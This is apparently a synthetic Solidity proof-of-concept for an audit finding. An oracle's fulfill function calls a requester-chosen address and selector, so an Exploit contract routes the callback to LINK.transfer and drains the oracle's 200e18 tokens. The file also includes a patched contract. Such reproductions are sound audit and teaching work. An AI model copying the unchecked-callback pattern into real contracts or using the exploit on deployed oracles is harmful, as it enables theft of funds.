// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Chainlink Oracle — fulfill calls the requester's callback verbatim
    (Sigma Prime, finding 19293).

    SYNTHETIC, cheatcode-free. The requester sets callback.addr to the LINK
    token, functionId to transfer(address,uint256), and the beneficiary to
    themselves. fulfill(200e18) becomes LINK.transfer(attacker, 200e18)
    with the oracle as msg.sender, so the oracle's LINK moves.

    The control rejects a callback aimed at the LINK token. The 200e18 stays. */

contract LinkToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Oracle {
    LinkToken public link;
    address public callback;
    bytes4 public functionId;
    address public beneficiary;

    constructor(LinkToken _link) {
        link = _link;
    }

    function request(address callbackAddr, bytes4 fn, address who) external virtual {
        callback = callbackAddr;
        functionId = fn;
        beneficiary = who;
    }

    function fulfill(uint256 data) external {
        // @> VULN: fulfill calls the requester-chosen address and selector, so a LINK.transfer drains the oracle.
        (bool ok,) = callback.call(abi.encodeWithSelector(functionId, beneficiary, data));
        require(ok, "callback");
        // FIX: reject callback equal to the LINK token, or only call the contract that created the request.
    }
}

contract OracleFixed is Oracle {
    constructor(LinkToken _link) Oracle(_link) {}

    function request(address callbackAddr, bytes4 fn, address who) external override {
        require(callbackAddr != address(link), "link callback");
        callback = callbackAddr;
        functionId = fn;
        beneficiary = who;
    }
}

contract Exploit {
    uint256 public constant N = 200 ether;

    LinkToken public link;
    Oracle public oracle;
    uint256 public stolen;

    constructor() {
        link = new LinkToken();
        oracle = new Oracle(link);
    }

    function run() external {
        link.mint(address(oracle), N);
        uint256 beforeBal = link.balanceOf(address(this));
        oracle.request(address(link), link.transfer.selector, address(this));
        oracle.fulfill(N);
        stolen = link.balanceOf(address(this)) - beforeBal;
        require(stolen == N, "harm");
        require(link.balanceOf(address(oracle)) == 0, "oracle still holds LINK");
    }
}
